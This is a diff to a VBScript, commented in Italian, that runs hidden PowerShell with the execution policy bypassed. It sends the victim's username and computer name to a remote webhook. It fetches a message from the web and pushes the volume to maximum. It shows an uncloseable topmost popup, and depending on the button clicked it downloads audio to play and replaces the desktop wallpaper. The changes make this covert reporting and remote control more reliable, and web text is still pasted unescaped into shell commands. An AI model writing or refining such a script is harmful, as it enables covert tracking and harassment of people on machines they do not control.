@@ -8,8 +8,9 @@ Dim urlMessaggio, webhookURL
 Dim messaggioDalWeb, nomeUtente, nomePC 
 Dim scelta1, scelta2, scelta3, sceltaEffettuata 
 
-scelta1 = "OK" 
-scelta2 = "" 
+' --- QUI METTI I TUOI TESTI ---
+scelta1 = "" 
+scelta2 = "OK" 
 scelta3 = "" 
 
 Dim ts: ts = Timer()
@@ -26,7 +27,7 @@ Set fso = CreateObject("Scripting.FileSystemObject")
 nomeUtente = shell.ExpandEnvironmentStrings("%USERNAME%") 
 nomePC = shell.ExpandEnvironmentStrings("%COMPUTERNAME%") 
 
-' --- NOTIFICA AVVIO (Dati puliti) ---
+' --- NOTIFICA AVVIO ---
 InviaNotificaRemoteWebhook webhookURL, nomeUtente, nomePC, "AVVIO", "In attesa"
 
 ' --- DOWNLOAD MESSAGGIO --- 
@@ -39,20 +40,24 @@ If xmlHttp.Status = 200 Then messaggioDalWeb = Trim(xmlHttp.responseText)
 shell.SendKeys Chr(&hAD)  
 For i = 1 To 50: shell.SendKeys Chr(&hAF): Next 
 
-' --- POPUP ORIGINALE --- 
+' --- POPUP (Versione Corretta) --- 
 If messaggioDalWeb <> "" Then 
+    ' Sostituiamo gli apici singoli con doppi apici per non rompere PowerShell
+    Dim msgSicuro: msgSicuro = Replace(messaggioDalWeb, "'", "''")
+    msgSicuro = Replace(Replace(msgSicuro, vbCr, " "), vbLf, " ")
+
     Dim psPopup 
     psPopup = "Add-Type -AssemblyName System.Windows.Forms; " & _ 
                "$f = New-Object Windows.Forms.Form; $f.Text = 'GEA'; $f.Size = '420,220'; " & _ 
                "$f.StartPosition = 'CenterScreen'; $f.FormBorderStyle = 'FixedDialog'; $f.ControlBox = $false; $f.TopMost = $true; " & _ 
-               "$l = New-Object Windows.Forms.Label; $l.Text = '" & messaggioDalWeb & "'; $l.TextAlign = 'MiddleCenter'; " & _ 
+               "$l = New-Object Windows.Forms.Label; $l.Text = '" & msgSicuro & "'; $l.TextAlign = 'MiddleCenter'; " & _ 
                "$l.Dock = 'Fill'; $l.Font = New-Object Drawing.Font('Segoe UI', 12); $f.Controls.Add($l); " & _ 
                "$p = New-Object Windows.Forms.FlowLayoutPanel; $p.Dock = 'Bottom'; $p.Height = 60; " & _ 
                "$p.FlowDirection = 'LeftToRight'; $p.WrapContents = $false; $p.Padding = New-Object Windows.Forms.Padding(0,10,0,0); " 
       
     If scelta1 <> "" Then psPopup = psPopup & "$b1 = New-Object Windows.Forms.Button; $b1.Text = '" & scelta1 & "'; $b1.AutoSize = $true; $b1.Add_Click({$global:res='" & scelta1 & "';$f.Close()}); $p.Controls.Add($b1); " 
     If scelta2 <> "" Then psPopup = psPopup & "$b2 = New-Object Windows.Forms.Button; $b2.Text = '" & scelta2 & "'; $b2.AutoSize = $true; $b2.Add_Click({$global:res='" & scelta2 & "';$f.Close()}); $p.Controls.Add($b2); " 
-    If scelta3 <> "" Then psPopup = psPopup & "$b3 = New-Object Windows.Forms.Button; $b3.Text = '" & scelta3 & "'; $b3.Add_Click({$global:res='" & scelta3 & "';$f.Close()}); $p.Controls.Add($b3); " 
+    If scelta3 <> "" Then psPopup = psPopup & "$b3 = New-Object Windows.Forms.Button; $b3.Text = '" & scelta3 & "'; $b3.AutoSize = $true; $b3.Add_Click({$global:res='" & scelta3 & "';$f.Close()}); $p.Controls.Add($b3); " 
       
     psPopup = psPopup & "$f.Add_Shown({ " & _ 
                "$totalWidth = 0; foreach($ctrl in $p.Controls) { $totalWidth += $ctrl.Width + $ctrl.Margin.Left + $ctrl.Margin.Right }; " & _ 
@@ -60,15 +65,16 @@ If messaggioDalWeb <> "" Then
                "}); " 
     psPopup = psPopup & "$f.Controls.Add($p); $f.ShowDialog() | Out-Null; Write-Output $global:res" 
       
-    Set exec = shell.Exec("powershell -WindowStyle Hidden -Command """ & psPopup & """") 
+    ' Usiamo Exec per catturare la scelta dell'utente
+    Set exec = shell.Exec("powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & psPopup & """") 
     sceltaEffettuata = Replace(Replace(Replace(exec.StdOut.ReadAll(), vbCrLf, ""), vbCr, ""), vbLf, "") 
 End If 
 
 ' --- LOGICA --- 
 Select Case sceltaEffettuata 
-    Case scelta1: CambiaFondoDesktop urlImmagineOK 
-    Case scelta2: 
-    Case scelta3: 
+    Case scelta1: RiproduciAudio urlAudioNO: CambiaFondoDesktop urlImmagineNO 
+    Case scelta2: CambiaFondoDesktop urlImmagineOK 
+    Case scelta3: RiproduciAudio urlAudioNO: CambiaFondoDesktop urlImmagineNO 
 End Select 
 
 ' --- NOTIFICA FINALE --- 
@@ -79,14 +85,14 @@ InviaNotificaRemoteWebhook webhookURL, nomeUtente, nomePC, messaggioDalWeb, scel
 Sub RiproduciAudio(urlAudio) 
     On Error Resume Next 
     Dim p: p = shell.ExpandEnvironmentStrings("%TEMP%") & "\a.mp3" 
-    shell.Run "powershell -Command ""(New-Object Net.WebClient).DownloadFile('" & urlAudio & "', '" & p & "')""", 0, True 
+    shell.Run "powershell -WindowStyle Hidden -Command ""(New-Object Net.WebClient).DownloadFile('" & urlAudio & "', '" & p & "')""", 0, True 
     If fso.FileExists(p) Then shell.Run "wmplayer.exe """ & p & """ /Play", 7, False 
 End Sub 
 
 Sub CambiaFondoDesktop(urlImmagine) 
     On Error Resume Next 
     Dim imgPath: imgPath = shell.ExpandEnvironmentStrings("%TEMP%") & "\bg_current.jpg" 
-    shell.Run "powershell -Command ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('" & urlImmagine & "', '" & imgPath & "')""", 0, True 
+    shell.Run "powershell -WindowStyle Hidden -Command ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('" & urlImmagine & "', '" & imgPath & "')""", 0, True 
     WScript.Sleep 2000 
     If fso.FileExists(imgPath) Then 
         Dim ps: ps = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "" " & _
@@ -100,11 +106,28 @@ End Sub
 
 Sub InviaNotificaRemoteWebhook(url, utente, pc, messaggio, scelta) 
     On Error Resume Next 
-    ' Creazione payload con variabili racchiuse tra virgolette singole per PowerShell
-    Dim body: body = "@{ 'utente' = '" & utente & "'; 'pc' = '" & pc & "'; 'scelta' = '" & scelta & "'; 'testo' = '" & messaggio & "' } | ConvertTo-Json"
-    Dim cmd: cmd = "powershell -Command ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; " & _
-                   "Invoke-RestMethod -Uri '" & url & "' -Method Post -Body (" & body & ") -ContentType 'application/json'"""
+    ' Escape per JSON (sostituisce caratteri problematici)
+    Dim u, p, s, m
+    u = Replace(Replace(utente, "\", "\\"), """", "\""")
+    p = Replace(Replace(pc, "\", "\\"), """", "\""")
+    s = Replace(Replace(scelta, "\", "\\"), """", "\""")
+    m = Replace(Replace(messaggio, "\", "\\"), """", "\""")
+    
+    ' Rimuove a capo e tab che potrebbero rompere il JSON
+    u = Replace(Replace(Replace(u, vbCr, ""), vbLf, ""), vbTab, "")
+    p = Replace(Replace(Replace(p, vbCr, ""), vbLf, ""), vbTab, "")
+    s = Replace(Replace(Replace(s, vbCr, ""), vbLf, ""), vbTab, "")
+    m = Replace(Replace(Replace(m, vbCr, " "), vbLf, " "), vbTab, " ")
+    
+    ' JSON costruito manualmente (più affidabile)
+    Dim jsonBody
+    jsonBody = "{""utente"":""" & u & """,""pc"":""" & p & """,""scelta"":""" & s & """,""testo"":""" & m & """}"
+    
+    Dim cmd
+    cmd = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & _
+          "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; " & _
+          "$body = '" & jsonBody & "'; " & _
+          "Invoke-RestMethod -Uri '" & url & "' -Method Post -Body $body -ContentType 'application/json'"""
+    
     shell.Run cmd, 0, True 
 End Sub
-
-
